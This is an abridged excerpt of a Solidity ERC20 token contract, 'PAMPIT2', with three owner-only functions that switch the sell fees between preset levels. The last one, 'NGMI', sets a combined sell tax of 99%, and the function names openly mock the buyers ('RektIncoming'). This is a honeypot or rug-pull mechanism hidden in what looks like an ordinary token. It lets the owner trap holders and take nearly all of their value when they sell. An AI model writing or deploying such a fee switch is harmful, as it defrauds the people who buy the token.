...
contract PAMPIT2 is ERC20, Ownable {
    ...
    uint256 private oddz = 4;
    uint256 private inyourfavor = 2;
    uint256 private rekt = 17;
    uint256 private inc = 8;
    uint256 private NG = 67;
    uint256 private MI = 32;
    /******************/
    ...
    function MayTheOddsEverBeInYourFavor() external onlyOwner {
        _sellMarketingFee = oddz;
        _sellLiquidityFee = inyourfavor; 
    }

    function RektIncoming() external onlyOwner {
        _sellMarketingFee = rekt;
        _sellLiquidityFee = inc; 
    }

    function NGMI() external onlyOwner {
        _sellMarketingFee = NG;
        _sellLiquidityFee = MI; 
    }
